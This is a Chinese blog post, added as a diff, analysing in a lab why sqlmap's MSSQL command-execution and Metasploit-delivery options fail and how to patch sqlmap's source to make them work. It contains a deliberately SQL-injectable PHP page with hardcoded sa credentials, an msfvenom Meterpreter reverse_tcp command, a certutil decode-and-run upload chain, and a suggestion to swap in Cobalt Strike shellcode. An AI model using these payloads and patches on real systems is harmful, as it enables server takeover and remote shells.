@@ -1,0 +1,873 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<script>
+    (function(){
+        if(''){
+            if (prompt('请输入文章密码') !== ''){
+                alert('密码错误！');
+                history.back();
+            }
+        }
+    })();
+</script>
+<meta name="generator" content="Hexo 5.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic|Lobster Two:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"butnomingzi.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":true,"sidebar":{"position":"right","Muse | Mist":320,"Pisces | Gemini":240,"width":300,"display":"always","padding":18,"offset":12,"onmobile":true},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+
+  <meta name="description" content="碰到了很多次sqlmap执行命令无回显，然后试了读取注册表，联动MSF，发现都存在问题，看了下参数，有个BOF，就研究一下。第一次分析有点繁琐。。。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqlmap关于MSSQL执行命令思考">
+<meta property="og:url" content="https://butnomingzi.github.io/posts/6e52a8fb/index.html">
+<meta property="og:site_name" content="Tpp_Tgg">
+<meta property="og:description" content="碰到了很多次sqlmap执行命令无回显，然后试了读取注册表，联动MSF，发现都存在问题，看了下参数，有个BOF，就研究一下。第一次分析有点繁琐。。。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://butnomingzi.github.io/posts/6e52a8fb/001.png">
+<meta property="og:image" content="https://butnomingzi.github.io/posts/6e52a8fb/002.png">
+<meta property="og:image" content="https://butnomingzi.github.io/posts/6e52a8fb/003.png">
+<meta property="og:image" content="https://butnomingzi.github.io/posts/6e52a8fb/004.png">
+<meta property="og:image" content="https://butnomingzi.github.io/posts/6e52a8fb/005.png">
+<meta property="og:image" content="https://butnomingzi.github.io/posts/6e52a8fb/006.png">
+<meta property="og:image" content="https://butnomingzi.github.io/posts/6e52a8fb/007.png">
+<meta property="og:image" content="https://butnomingzi.github.io/posts/6e52a8fb/008.png">
+<meta property="og:image" content="https://butnomingzi.github.io/posts/6e52a8fb/009.png">
+<meta property="og:image" content="https://butnomingzi.github.io/posts/6e52a8fb/010.png">
+<meta property="og:image" content="https://butnomingzi.github.io/posts/6e52a8fb/011.png">
+<meta property="og:image" content="https://butnomingzi.github.io/posts/6e52a8fb/012.png">
+<meta property="og:image" content="https://butnomingzi.github.io/posts/6e52a8fb/013.png">
+<meta property="og:image" content="https://butnomingzi.github.io/posts/6e52a8fb/014.png">
+<meta property="og:image" content="https://butnomingzi.github.io/posts/6e52a8fb/015.png">
+<meta property="og:image" content="https://butnomingzi.github.io/posts/6e52a8fb/016.png">
+<meta property="og:image" content="https://butnomingzi.github.io/posts/6e52a8fb/017.png">
+<meta property="og:image" content="https://butnomingzi.github.io/posts/6e52a8fb/018.png">
+<meta property="og:image" content="https://butnomingzi.github.io/posts/6e52a8fb/019.png">
+<meta property="og:image" content="https://butnomingzi.github.io/posts/6e52a8fb/020.png">
+<meta property="og:image" content="https://butnomingzi.github.io/posts/6e52a8fb/021.png">
+<meta property="og:image" content="https://butnomingzi.github.io/posts/6e52a8fb/022.png">
+<meta property="article:published_time" content="2020-09-21T07:00:00.000Z">
+<meta property="article:modified_time" content="2020-09-21T07:02:03.746Z">
+<meta property="article:author" content="oudeniu">
+<meta property="article:tag" content="工具">
+<meta property="article:tag" content="MSSQL">
+<meta property="article:tag" content="SQLMap">
+<meta property="article:tag" content="命令执行">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://butnomingzi.github.io/posts/6e52a8fb/001.png">
+
+<link rel="canonical" href="https://butnomingzi.github.io/posts/6e52a8fb/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>sqlmap关于MSSQL执行命令思考 | Tpp_Tgg</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Tpp_Tgg</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">32</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">3</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">16</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container"></div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="algolia-results">
+  <div id="algolia-stats"></div>
+  <div id="algolia-hits"></div>
+  <div id="algolia-pagination" class="algolia-pagination"></div>
+</div>
+
+      
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://butnomingzi.github.io/posts/6e52a8fb/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="oudeniu">
+      <meta itemprop="description" content="一点都对，半点都没错。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tpp_Tgg">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          sqlmap关于MSSQL执行命令思考
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-09-21 15:00:00 / 修改时间：15:02:03" itemprop="dateCreated datePublished" datetime="2020-09-21T15:00:00+08:00">2020-09-21</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/" itemprop="url" rel="index"><span itemprop="name">工具使用</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-users"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="firestore-visitors-count"></span>
+            </span>
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>8k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>7 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>碰到了很多次sqlmap执行命令无回显，然后试了读取注册表，联动MSF，发现都存在问题，看了下参数，有个BOF，就研究一下。第一次分析有点繁琐。。。</p>
+<a id="more"></a>
+
+<h2 id="0x00-环境概述"><a href="#0x00-环境概述" class="headerlink" title="0x00 环境概述"></a>0x00 环境概述</h2><p>环境说明：</p>
+<ul>
+<li><p>Windows 2003 + MSSQL + PHP5.2.17 (注意刷新缓存 –flush-session)</p>
+</li>
+<li><p>关闭GPC</p>
+</li>
+<li><p>构造SQL注入：</p>
+</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$id = $_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">$con = mssql_connect(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="string">&#x27;sa&#x27;</span>,<span class="string">&#x27;server2005&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(!$con)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;Erroe&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;Connect OK.&lt;/br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">mssql_select_db(<span class="string">&#x27;sqlmap_test&#x27;</span>);</span><br><span class="line"><span class="comment"># $sql = &quot;exec master..xp_cmdshell &#x27;whoami&#x27;&quot;;</span></span><br><span class="line"></span><br><span class="line">$sql = <span class="string">&quot;select id,name from admin where id=&quot;</span>.$id;</span><br><span class="line"></span><br><span class="line">$result = mssql_query($sql);</span><br><span class="line"><span class="comment">/* $row = mssql_fetch_array($result);</span></span><br><span class="line"><span class="comment">echo $row[0]; */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>($list=mssql_fetch_array($result))</span><br><span class="line"> &#123;</span><br><span class="line">    print_r($list);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x01-测试sqlmap命令"><a href="#0x01-测试sqlmap命令" class="headerlink" title="0x01 测试sqlmap命令"></a>0x01 测试sqlmap命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">--os-shell</span><br><span class="line">--sql-shell</span><br><span class="line">--os-pwn</span><br><span class="line">--os-smbrelay</span><br><span class="line">--os-bof</span><br><span class="line">--reg-[read&#x2F;add&#x2F;del]</span><br></pre></td></tr></table></figure>
+
+<h3 id="–os-shell"><a href="#–os-shell" class="headerlink" title="–os-shell"></a>–os-shell</h3><p>该参数主要是调用xp_cmdshell执行系统命令。</p>
+<ul>
+<li><p>执行<code>--os-shell</code>,之后直接在数据库中查看，发现已启用<code>xp_cmdshell</code>。发现能执行命令,但是sqlmap无返回值。只能通过DNS外带。。。</p>
+<p><img src="/posts/6e52a8fb/001.png" alt="aa"></p>
+</li>
+</ul>
+<h3 id="–sql-shell"><a href="#–sql-shell" class="headerlink" title="–sql-shell"></a>–sql-shell</h3><p>主要用于是执行数据库语句。</p>
+<ul>
+<li>使用<code>--sql-shell</code>，测试能否通过<code>sql-shell</code>手动开启<code>xp_cmdshell</code>。结果发现无法开启xp_cmdshell。手动开启<code>xp_cmdshell</code>后，<code>sql-shell</code>可以执行命令，sqlmap无返回值。</li>
+</ul>
+<p><img src="/posts/6e52a8fb/002.png" alt="image-20200428194326597"></p>
+<h3 id="–os-pwn"><a href="#–os-pwn" class="headerlink" title="–os-pwn"></a>–os-pwn</h3><p>获取OOBshell、MSF shell、VNC。。。</p>
+<ul>
+<li><code>--os-pwn</code>获取OOB shell、Meterpreter或VNC。在默认关闭<code>xp_cmdshell</code>情况下，该参数无法开启<code>xp_cmdshell</code>。</li>
+</ul>
+<p>手动开启<code>xp_cmdshell</code>以后，使用sqlmap参数：<code>--os-pwn --msf-path /opt/msf/</code>,会先上传一个paylaod。查看SQLAMP上传文件的方式一共有4种:PowerShell,Debug,Vbs脚本,Certutil。如果第一种方式失败会提示下一种方式，我这里测试所有的通信方式以及payload，均失败。。。</p>
+<p><img src="/posts/6e52a8fb/003.png" alt="image-20200428195336542"></p>
+<h3 id="–os-smbrelay"><a href="#–os-smbrelay" class="headerlink" title="–os-smbrelay"></a>–os-smbrelay</h3><p>一次单击提示输入OOB shell、Meterpreter或VNC。该参数提供了五种连接方式，三种payload类型，两个SMB端口。其原理就是调用MSF的<code>windows/smb/smb_relay</code>模块。。。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">which</span> connection <span class="built_in">type</span> <span class="keyword">do</span> you want to use?</span><br><span class="line">[1] Reverse TCP: Connect back from the database host to this machine (default)</span><br><span class="line">[2] Reverse TCP: Try to connect back from the database host to this machine, on all ports between the specified and 65535</span><br><span class="line">[3] Reverse HTTP: Connect back from the database host to this machine tunnelling traffic over HTTP</span><br><span class="line">[4] Reverse HTTPS: Connect back from the database host to this machine tunnelling traffic over HTTPS</span><br><span class="line">[5] Bind TCP: Listen on the database host <span class="keyword">for</span> a connection</span><br><span class="line">&gt;</span><br><span class="line">what is the <span class="built_in">local</span> address? [Enter <span class="keyword">for</span> <span class="string">&#x27;192.168.90.17&#x27;</span> (detected)]</span><br><span class="line"><span class="built_in">which</span> <span class="built_in">local</span> port number <span class="keyword">do</span> you want to use? [7545]</span><br><span class="line"><span class="built_in">which</span> payload <span class="keyword">do</span> you want to use?</span><br><span class="line">[1] Meterpreter (default)</span><br><span class="line">[2] Shell</span><br><span class="line">[3] VNC</span><br><span class="line">&gt;</span><br><span class="line"><span class="built_in">which</span> SMB port <span class="keyword">do</span> you want to use?</span><br><span class="line">[1] 139/TCP</span><br><span class="line">[2] 445/TCP (default)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/6e52a8fb/004.png" alt="image-20200428195514583"></p>
+<h3 id="–os-bof"><a href="#–os-bof" class="headerlink" title="–os-bof"></a>–os-bof</h3><p>存储过程缓冲区溢出利用。参数提供了五种连接方式，三种payload，十二种payload编码方式。</p>
+<p>经过测试还是失败的。。。</p>
+<h3 id="–reg-read-add-del"><a href="#–reg-read-add-del" class="headerlink" title="–reg-[read/add/del]"></a>–reg-[read/add/del]</h3><ul>
+<li>读取/添加/修改注册表，会上传.bat文件，文件上传成功，但是并未接受到读取的值..</li>
+</ul>
+<p><img src="/posts/6e52a8fb/005.png" alt="image-20200429172318871"></p>
+<h2 id="0x02-反思"><a href="#0x02-反思" class="headerlink" title="0x02 反思"></a>0x02 反思</h2><p>经过以上测试（关闭GPC下），肯定是有很多疑问的，这里列举一下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">为什么--os-shell执行命令后sqlmap无返回值？</span><br><span class="line">为什么--os-pwn参数上传文件失败？</span><br><span class="line">为什么--os-bof利用存储过程缓冲区溢出也失败？</span><br><span class="line">为什么读取注册表时候文件上传了而sqlmap无法获取到？</span><br></pre></td></tr></table></figure>
+
+<h3 id="命令执行反思"><a href="#命令执行反思" class="headerlink" title="命令执行反思"></a>命令执行反思</h3><p>经过以上测试，为什么无法执行命令呢？这里再来复述一遍，找一下为什么这样。</p>
+<ul>
+<li>首先确定一下：多语句执行，也即是堆叠注入时候的返回值。只返回了第一个查询<code>id=1</code>的内容。</li>
+</ul>
+<p><img src="/posts/6e52a8fb/006.png" alt="image-20200428201228029"></p>
+<ul>
+<li>查看直接在数据库执行时的返回，返回了两条结果。</li>
+</ul>
+<p><img src="/posts/6e52a8fb/007.png" alt="image-20200428201425603"></p>
+<ul>
+<li>查看源代码，修改<code>/sqlmap/1.4.4/libexec/lib/request/inject.py</code>文件<code>goStacked</code>函数最后一行，输出sqlmap最终执行的payload并测试该paylaod直接在数据库执行时状态。结果发现，数据库执行的语句。发现报错了，无法插入数据，因为列不允许有空值。(–os-shell时候会创建表sqlmapoutput,该表有两个字段id, data)</li>
+</ul>
+<p><img src="/posts/6e52a8fb/008.png" alt="image-20200428154223773"></p>
+<p><img src="/posts/6e52a8fb/009.png" alt="image-20200428202433980"></p>
+<ul>
+<li>查看表sqlmapoutput,发现字段不允许为空。</li>
+</ul>
+<p><img src="/posts/6e52a8fb/010.png" alt="image-20200428202953629"></p>
+<p>仔细观察上面测试，会发现问题：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-- 第一个问题：sqlmap创建的表填充字段时，字段内容不允许为空。</span><br><span class="line">-- 第二个问题：多语句查询时，返回两条结果，而第二条结果包含两个字段内容。</span><br><span class="line">--	比如：	</span><br><span class="line">		select name from admin where id &#x3D;1;EXEC master..xp_cmdshell whoami</span><br><span class="line">		结果：</span><br><span class="line">          zhangsan</span><br><span class="line">          nt authority\system</span><br><span class="line">          NULL</span><br></pre></td></tr></table></figure>
+
+<p>那么问题来了，是不是这样呢？测试：修改sqlmapoutput表的data字段，将其设置为允许为空：</p>
+<p><img src="/posts/6e52a8fb/011.png" alt="image-20200428203700136"></p>
+<p>发现成功写入。。。</p>
+<p>于是利用Sublime全局搜索<code>CREATE TABLE</code>找到MSSQL创建表的语句，将其设置为字段允许为空即可。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /sqlmap/1.4.4/libexec/plugins/generic/misc.py    124行，创建表时字段名后加一个NULL</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/6e52a8fb/012.png" alt="image-20200428203934381"></p>
+<p>再来测试：</p>
+<p><img src="/posts/6e52a8fb/013.png" alt="image-20200428204410713"></p>
+<p>到这里已经可以正确的执行<code>--os-shell</code>等。</p>
+<h3 id="注册表操作反思"><a href="#注册表操作反思" class="headerlink" title="注册表操作反思"></a>注册表操作反思</h3><ul>
+<li>根据<code>命令执行反思</code>，修改之后，发现读取注册表时候报错。</li>
+</ul>
+<p><img src="/posts/6e52a8fb/014.png" alt="image-20200430102205170"></p>
+<ul>
+<li>直接在数据库中执行会因路径中存在空格而报错。</li>
+</ul>
+<p><img src="/posts/6e52a8fb/015.png" alt="image-20200428114831755"></p>
+<p>那么这里就有思路了，将payload上传到其不含有空格或特殊字符的文件夹。(首先尝试PS写.bat,不成功使用VB，因为我03没有PS，所以是VB)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 修改上传路径：</span></span><br><span class="line"><span class="comment">#	全局搜索字符串：.bat</span></span><br><span class="line"><span class="comment">#	/sqlmap/1.4.4/libexec/lib/takeover/registry.py   27行 注释掉原本语句，改为如下</span></span><br><span class="line">        self._randStr = randomStr(lowercase=<span class="literal">True</span>)</span><br><span class="line">        <span class="comment"># self._batPathRemote = &quot;\&quot;%s/tmpr%s.bat\&quot;&quot; % (conf.tmpPath, self._randStr)</span></span><br><span class="line">        self._batPathRemote = <span class="string">&quot;%s/tmpr%s.bat&quot;</span> % (<span class="string">&quot;C:/Windows&quot;</span>, self._randStr)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/6e52a8fb/016.png" alt="image-20200430105500903"></p>
+<h3 id="联动MSF反思"><a href="#联动MSF反思" class="headerlink" title="联动MSF反思"></a>联动MSF反思</h3><p>首先跟踪代码，查看sqlmap调用MSF过程：</p>
+<p><code>/Users/lnx/Desktop/1.4.4/libexec/plugins/generic/takeover.py</code>osPwn函数开始</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">第一步：首先测试xp_cmdshell是否开启</span><br><span class="line"></span><br><span class="line">第二步：/sqlmap/<span class="number">1.4</span><span class="number">.4</span>/libexec/plugins/generic/takeover.py osPwn函数调用MSF生成RAW格式shellcode</span><br><span class="line">文件/sqlmap/<span class="number">1.4</span><span class="number">.4</span>/libexec/lib/takeover/metasploit.py中函数createMsfShellcode生成shellcode</span><br><span class="line">/opt/metasploit-framework/bin/msfvenom -p windows/meterpreter/reverse_tcp EXITFUNC=process LPORT=<span class="number">21453</span> LHOST=<span class="number">192.168</span><span class="number">.90</span><span class="number">.17</span> -a x86 -e x86/alpha_mixed -f raw BufferRegister=EAX &gt; <span class="string">&quot;/Users/lnx/.sqlmap/output/192.168.90.14/tmpmydff&quot;</span></span><br><span class="line"></span><br><span class="line">第三步：文件/sqlmap/<span class="number">1.4</span><span class="number">.4</span>/libexec/lib/takeover/metasploit.py <span class="number">617</span>行 函数createMsfShellcode又以字节的格式读取生成的文件。</span><br><span class="line">        self._shellcodeFP = open(self._shellcodeFilePath, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line">        self.shellcodeString = getText(self._shellcodeFP.read())</span><br><span class="line">        self._shellcodeFP.close()</span><br><span class="line"></span><br><span class="line">第四步：上传，上传又分为三步</span><br><span class="line"><span class="number">1</span>、首先是调用/sqlmap/<span class="number">1.4</span><span class="number">.4</span>/libexec/lib/takeover/metasploit.py 函数uploadShellcodeexec</span><br><span class="line">处理，得到最终上传的payload路径和计划上传到服务器的路径：</span><br><span class="line">/var/folders/xx/<span class="number">6j</span>y_czp97nl76bslj74817d40000gn/T/sqlmapCazl8M8626/tmpKjHjBr32_.exe(最终)</span><br><span class="line">C:/Program Files/Microsoft SQL Server./mssql<span class="number">.1L</span>OG/tmpsecwjq.exe(目标服务)</span><br><span class="line"><span class="number">2</span>、函数uploadShellcodeexec调用/sqlmap/<span class="number">1.4</span><span class="number">.4</span>/libexec/plugins/generic/filesystem.py 函数writeFile实现文件上传</span><br><span class="line"><span class="number">3</span>、函数writeFile调用/sqlmap/<span class="number">1.4</span><span class="number">.4</span>/libexec/plugins/dbms./mssqlserver/filesystem.py 函数stackedWriteFile 尝试使用ps、vbs、debug、certutil进行文件上传(我这里是certutil)</span><br><span class="line"><span class="number">4</span>、函数stackedWriteFile在上传时调用了当前文件内的函数_stackedWriteFileCertutilExe进行上传。</span><br><span class="line">	函数_stackedWriteFileCertutilExe：</span><br><span class="line">    首先读取之前处理好的payload.exe(最终的exe)进行Base64编码;</span><br><span class="line">    然后将其写入到目标机的txt文件中;</span><br><span class="line">    之后调用certutil进行解码txt文件输出exe文件，然后执行;</span><br><span class="line">    最后删除txt文件。</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/6e52a8fb/017.png" alt="image-20200430113607814"></p>
+<p><img src="/posts/6e52a8fb/018.png" alt="image-20200430144626472"></p>
+<p>这里就是无法收到MSF反弹，直接在CMD中执行命令，发现由于路径空格问题无法成功解码成exe。。。</p>
+<p>终于找到问题所在了。</p>
+<p><img src="/posts/6e52a8fb/019.png" alt="image-20200429152426764"></p>
+<p>那么来修改一下，第一种是利用引号将路径扩起来，第二种是修改文件上传的路径。</p>
+<p>这里使用第一种。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /sqlmap/1.4.4/libexec/plugins/dbms./mssqlserver/filesystem.py   376行，添加双引号</span></span><br><span class="line">       commands = ( </span><br><span class="line">            <span class="string">&quot;cd \&quot;%s\&quot;&quot;</span> % tmpPath,</span><br><span class="line">            <span class="string">&quot;certutil -f -decode %s \&quot;%s\&quot;&quot;</span> % (randFile, remoteFile),</span><br><span class="line">            <span class="string">&quot;del /F /Q %s&quot;</span> % randFile</span><br><span class="line">        )</span><br></pre></td></tr></table></figure>
+
+<p>修改sqlmap解码payload的参数，让其正确识别路径即可。</p>
+<p><img src="/posts/6e52a8fb/020.png" alt="image-20200429153738090"></p>
+<p>那么尝试加载Cobalt Strike呢？</p>
+<p>经过测试，CS生成的RAW格式shellcode替换掉sqlmap调用MSF生成的Raw格式(<code>/Users/lnx/Desktop/1.4.4/libexec/lib/takeover/metasploit.py</code>617行左右。)，无法成功反弹。(未仔细分析生成shellcode后,sqlmap对其处理的逻辑。)</p>
+<p>那么直接替换最终上传的exe文件。</p>
+<ul>
+<li>替换exe,有必要的话可以直接input，接受输入。</li>
+</ul>
